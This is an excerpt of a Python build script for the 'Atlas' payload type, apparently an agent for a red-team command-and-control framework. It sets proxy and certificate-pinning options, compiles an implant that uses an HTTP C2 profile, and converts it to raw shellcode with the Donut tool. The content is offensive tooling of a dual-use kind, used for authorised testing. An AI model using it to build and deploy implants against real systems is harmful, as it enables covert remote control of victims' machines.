...
class Atlas(PayloadType):
    ...
    build_parameters = {
        ...
        "chunk_size": BuildParameter(name="chunk_size", parameter_type=BuildParameterType.String, default_value="512000",
                       description="Provide a chunk size for large files", required=True),
        "cert_pinning": BuildParameter(name="cert_pinning",  parameter_type=BuildParameterType.ChooseOne, choices=["false", "true"], default_value="false", required=False, description="Require Certificate Pinning"),
        "query_param": BuildParameter(name="query_param", parameter_type=BuildParameterType.String, description="query parameter for GET requests", default_value="id", required=False),
        "default_proxy": BuildParameter(name="default_proxy", parameter_type=BuildParameterType.ChooseOne, choices=["true", "false"], default_value="true", required=False, description="Use the default proxy on the system"),
        "proxy_address": BuildParameter(name="proxy_address", parameter_type=BuildParameterType.String, required=False, default_value="", description="Manually specify a proxy address"),
        "proxy_user": BuildParameter(name="proxy_user", parameter_type=BuildParameterType.String, required=False, default_value="", description="Manually specify proxy user"),
        "proxy_password": BuildParameter(name="proxy_password", parameter_type=BuildParameterType.String, required=False, default_value="", description="Manually specify proxy password"),
        "output_type": BuildParameter(name="output_type", parameter_type=BuildParameterType.ChooseOne, choices=["WinExe", "Raw"], default_value="WinExe", description="Output as an EXE or Raw shellcode from Donut")
    }
    c2_profiles = ["HTTP"]
    ...
    async def build(self) -> BuildResponse:
        ...
        try:
            ...
            file1 = file1.replace('%PROXY_ADDRESS%', self.get_parameter('proxy_address'))
            file1 = file1.replace('%PROXY_USER%', self.get_parameter('proxy_user'))
            file1 = file1.replace('%PROXY_PASSWORD%', self.get_parameter('proxy_password'))
            profile = None
            ...
            defines = ["TRACE"]
            if profile == "HTTP":
                if self.c2info[0].get_parameters_dict()['encrypted_exchange_check'] == "T":
            ...
            if os.path.exists("{}/Atlas.exe".format(agent_build_path.name)):
                ...
                if self.get_parameter('output_type') != "Raw":
                    resp.payload = open("{}/Atlas.exe".format(agent_build_path.name), 'rb').read()
                    ...
                    if self.get_parameter('arch') == "x64" or self.get_parameter('arch') == "Any CPU":
                        command = "{}/donut -f 1 -a 2 {}/Atlas.exe".format(agent_build_path.name, agent_build_path.name)
                    else:
                        command = "{}/donut -f 1 -a 1 {}/Atlas.exe".format(agent_build_path.name, agent_build_path.name)
                    proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                    stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
                    stdout, stderr = await proc.communicate()
                    if stdout:
                    ...
                    if os.path.exists("{}/loader.bin".format(agent_build_path.name)):
                        ...
                        resp.status = BuildStatus.Success
                        resp.message = "Successfully used Donut to generate Raw Shellcode"
                    else:
